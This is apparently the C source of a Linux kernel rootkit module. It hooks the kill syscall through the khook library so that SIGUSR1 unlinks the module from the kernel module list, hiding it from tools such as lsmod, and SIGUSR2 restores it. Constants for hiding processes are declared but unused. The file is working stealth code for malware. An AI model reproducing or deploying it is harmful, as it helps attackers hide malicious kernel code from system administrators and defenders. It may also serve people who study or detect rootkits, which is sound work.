#include <linux/syscalls.h>
#include <linux/signal.h>
#include <khook/engine.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/list.h>
MODULE_LICENSE("GPL");


void module_hide(void);

void module_show(void);

enum{
    SIGINVISMOD = SIGUSR1, //10
    SIGVISMOD = SIGUSR2, //12
};
const int SIGINVISPROC = SIGRTMIN;
const int SIGVISPROC = SIGRTMAX;

KHOOK_EXT(long, __x64_sys_kill, const struct  pt_regs *);
static long khook___x64_sys_kill(const struct pt_regs *regs){
    switch(regs->si){
    
        case SIGINVISMOD:
           module_hide();
           break;
        case SIGVISMOD:
           module_show();
           break;
        default:
           KHOOK_ORIGIN(__x64_sys_kill, regs);
    }
    return 0;
}

static struct list_head *prev_mod;
static int is_hidden = 0;

void module_hide(void){
    if (!is_hidden){
        prev_mod = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        is_hidden = 1;
        printk(KERN_ALERT "MODULE JUST HIDDEN\n!");
    }
}

void module_show(void){
    if (is_hidden){
        list_add(&THIS_MODULE->list, prev_mod);
        is_hidden = 0;
        printk(KERN_ALERT "MODULE JUST SHOWN\n!");
    }
}

static int __init rootkit_init(void){
    khook_init();
    printk(KERN_ALERT "Hello world\n!");
    return 0;
}

static void __exit rootkit_exit(void){
    khook_cleanup();
    printk(KERN_ALERT "Goodbye world(((\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
